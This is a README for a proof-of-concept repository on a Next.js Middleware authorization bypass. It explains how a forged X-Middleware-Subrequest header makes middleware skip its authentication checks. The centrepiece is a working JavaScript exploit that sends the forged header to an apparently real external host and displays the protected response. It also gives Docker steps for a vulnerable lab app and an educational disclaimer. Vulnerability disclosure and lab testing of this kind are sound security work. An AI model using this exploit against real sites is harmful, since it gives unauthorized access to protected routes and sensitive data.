# Next.js Middleware Authorization Bypass PoC

This project demonstrates an **Authorization Bypass vulnerability in Next.js Middleware**, as described in [ProjectDiscovery Blog](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).

## 📝 Vulnerability Summary

Next.js Middleware is a powerful feature to process requests at the edge before reaching the application logic. However, if the `X-Middleware-Subrequest` header is not properly validated, it can lead to **authentication and authorization bypass**.

### Root Cause:

- Middleware relies on the `X-Middleware-Subrequest` header to determine internal subrequests.
- An attacker can forge this header to trick the Middleware into skipping critical checks (such as authentication).

### Impact:

- Unauthorized access to protected routes and sensitive data.
- Bypassing authentication mechanisms implemented via Middleware.

## 🚀 Proof of Concept (PoC)

The following JavaScript snippet demonstrates how an attacker can bypass the Middleware protections:

```javascript
(function () {
  var iframe = document.createElement("iframe");
  iframe.style.display = "none";
  iframe.src = "https://zerotix.liara.run/protected-route";
  document.body.appendChild(iframe);
  iframe.onload = function () {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://zerotix.liara.run/protected-route", true);
    xhr.setRequestHeader("X-Middleware-Subrequest", "middleware:middleware:middleware:middleware:middleware");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log("%c[+] Middleware Bypassed! Response Loaded Below:", "color: green;");
          console.log(xhr.responseText);
          var newWin = window.open();
          newWin.document.write(xhr.responseText);
        } else {
          console.error("[-] Bypass Failed. Status:", xhr.status);
        }
      }
    };
    xhr.send();
  };
})();
```

### Explanation:

- Loads the protected route in a hidden iframe to establish a valid origin context.
- Sends an XMLHttpRequest with a crafted `X-Middleware-Subrequest` header.
- If the bypass is successful, it logs and displays the response content.

## 🐳 Running the Vulnerable App (Docker)

Follow these steps to run the vulnerable Next.js application:

### 1. Build the Docker image:

```bash
docker build -t nextjs-middleware-bypass .
```

### 2. Run the Docker container:

```bash
docker run -p 3000:3000 nextjs-middleware-bypass
```

### 3. Access the application at:

```
http://localhost:3000
```

## 🔗 References

- [ProjectDiscovery Blog — Next.js Middleware Authorization Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)

## ⚠️ Disclaimer

This project is intended for **educational purposes only**. Unauthorized exploitation of systems is illegal. Always ensure you have proper authorization before performing security testing.
